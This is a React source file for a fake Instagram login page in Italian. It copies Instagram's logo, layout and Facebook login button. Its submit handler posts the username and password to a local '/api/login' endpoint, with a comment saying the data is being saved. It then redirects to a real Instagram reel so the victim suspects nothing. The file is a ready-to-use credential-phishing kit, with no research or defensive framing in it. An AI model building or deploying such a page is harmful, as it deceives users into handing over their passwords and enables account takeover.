import React, { useState, useEffect } from 'react';
import axios from 'axios';

// Importa le immagini
import instagramLogo from '../assets/images/instagram-logo.png';
import appStoreBadge from '../assets/images/app-store-badge.png';
import googlePlayBadge from '../assets/images/google-play-badge.png';
// Se hai una versione del logo per il tema scuro, importala così
import instagramLogoDark from '../assets/images/instagram-logo-dark.png'; // Se disponibile

// Componente per l'icona di Facebook
const FacebookIcon = ({ darkMode }) => {
  return (
    <svg 
      xmlns="http://www.w3.org/2000/svg" 
      viewBox="0 0 16 16" 
      width="16" 
      height="16" 
      className="facebook-svg-icon"
    >
      <rect width="16" height="16" rx="2" fill={darkMode ? "#4395f6" : "#385185"}/>
      <path d="M11.1 16V9.8h2.1l.3-2.4h-2.4V5.8c0-.7.2-1.2 1.2-1.2h1.3V2.4c-.6-.1-1.3-.1-1.9-.1-1.9 0-3.2 1.2-3.2 3.3v1.8H6.4v2.4h2.1V16h2.6z" fill="#ffffff"/>
    </svg>
  );
};

const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [darkMode, setDarkMode] = useState(false);

  // Rileva il tema del browser all'avvio
  useEffect(() => {
    // Verifica se il browser preferisce il tema scuro
    const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
    setDarkMode(prefersDarkMode);
    
    // Aggiungi un listener per rilevare cambiamenti nel tema del sistema
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    const handleChange = (e) => {
      setDarkMode(e.matches);
    };
    
    mediaQuery.addEventListener('change', handleChange);
    
    // Pulizia del listener quando il componente viene smontato
    return () => {
      mediaQuery.removeEventListener('change', handleChange);
    };
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      // Simuliamo una richiesta al backend per salvare i dati
      const response = await axios.post('/api/login', {
        username,
        password,
        theme: darkMode ? 'dark' : 'light' // Inviamo anche l'informazione sul tema
      });
      
      // Redirect all'URL del reels che fornirai
      window.location.href = 'https://www.instagram.com/reel/DBizR1Wti2p/';
      
    } catch (err) {
      setError('Si è verificato un problema durante l\'accesso. Riprova più tardi.');
      console.error('Error:', err);
    } finally {
      setLoading(false);
    }
  };

  // Funzione per cambiare manualmente il tema
  const toggleTheme = () => {
    setDarkMode(!darkMode);
  };

  return (
    <div className={`instagram-container ${darkMode ? 'dark-mode' : 'light-mode'}`}>
      <div className="theme-toggle" onClick={toggleTheme}>
        {darkMode ? '☀️' : '🌙'}
      </div>
      
      <div className="login-container">
        <div className="form-container">
          <div className="logo-container">
            <img 
              // Usa il logo appropriato in base al tema
              src={darkMode && instagramLogoDark ? instagramLogoDark : instagramLogo} 
              alt="Instagram" 
              className="instagram-logo" 
            />
          </div>
          
          <form onSubmit={handleSubmit}>
            <div className="input-container">
              <input
                type="text"
                placeholder="Numero di telefono, nome utente o email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
            </div>
            
            <div className="input-container">
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
            </div>
            
            <button 
              type="submit" 
              className={`login-button ${(username && password) ? 'active' : ''}`}
              disabled={!username || !password || loading}
            >
              {loading ? 'Accesso in corso...' : 'Accedi'}
            </button>
          </form>
          
          <div className="divider">
            <div className="line"></div>
            <div className="or">oppure</div>
            <div className="line"></div>
          </div>
          
          <div className="facebook-login">
            {/* Utilizziamo qui l'icona SVG di Facebook */}
            <FacebookIcon darkMode={darkMode} />
            <span>Accedi con Facebook</span>
          </div>
          
          {error && <div className="error-message">{error}</div>}
          
          <div className="forgot-password">
            <a href="#">Password dimenticata?</a>
          </div>
        </div>
        
        <div className="signup-container">
          <p>
            Non hai un account? <a href="#">Iscriviti</a>
          </p>
        </div>
        
        <div className="app-download">
          <p>Scarica l'applicazione.</p>
          <div className="app-links">
            <a href="#" className="app-link">
              <img 
                src={appStoreBadge}
                alt="App Store" 
                className="app-store" 
              />
            </a>
            <a href="#" className="app-link">
              <img 
                src={googlePlayBadge}
                alt="Google Play" 
                className="google-play" 
              />
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;